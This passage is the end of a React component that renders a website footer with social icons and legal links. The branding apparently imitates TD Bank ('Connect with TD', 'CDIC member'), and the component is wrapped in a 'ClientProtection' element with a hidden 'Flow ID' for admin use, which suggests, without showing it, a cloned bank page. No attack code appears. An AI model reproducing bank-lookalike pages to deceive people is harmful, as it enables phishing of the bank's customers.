                    <a
                      href="#"
                      className="text-green-300 hover:text-green-200 inline-flex items-center font-medium"
                    >
                      Contact us{" "}
                      <svg
                        className="w-4 h-4 ml-1"
                        fill="currentColor"
                        viewBox="0 0 20 20"
                      >
                        <path
                          fillRule="evenodd"
                          d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z"
                          clipRule="evenodd"
                        />
                      </svg>
                    </a>
                  </p>

                  <p className="text-lg mb-4">Connect with TD</p>
                  <div className="flex justify-center space-x-4 mb-4">
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.174-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.402.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.357-.629-2.746-1.378l-.748 2.853c-.271 1.043-1.002 2.35-1.492 3.146C9.57 23.812 10.763 24.009 12.017 24.009c6.624 0 11.99-5.367 11.99-11.988C24.007 5.367 18.641.001.012.001z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z" />
                      </svg>
                    </a>
                    <a
                      href="#"
                      className="w-10 h-10 border-2 border-white rounded-full flex items-center justify-center hover:bg-white hover:text-[#12412a] transition-colors"
                    >
                      <svg
                        className="w-5 h-5"
                        fill="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" />
                      </svg>
                    </a>
                  </div>
                </div>
              </div>
            </div>

            {/* Bottom Section - Privacy Links */}
            <div className="pt-2">
              <div className="flex flex-wrap justify-center gap-6 text-sm w-full">
                <a href="#" className="hover:text-green-300 transition-colors">
                  Privacy and Security
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Legal
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Accessibility
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  CDIC member
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  About Us
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  We&apos;re Hiring
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Manage online experience
                </a>
                <a href="#" className="hover:text-green-300 transition-colors">
                  Site Index
                </a>
              </div>

              {/* Mobile armchair - shown at bottom on mobile only */}
              <div className="flex justify-center md:hidden mt-4">
                <img
                  src="/footer_seat.png"
                  alt="Chair"
                  className="h-32 w-auto"
                />
              </div>
            </div>
          </div>
        </footer>

        {/* Flow ID hidden from user - for admin context only */}
        <div className="hidden">Flow ID: {flowId}</div>
      </div>
    </ClientProtection>
  );
}
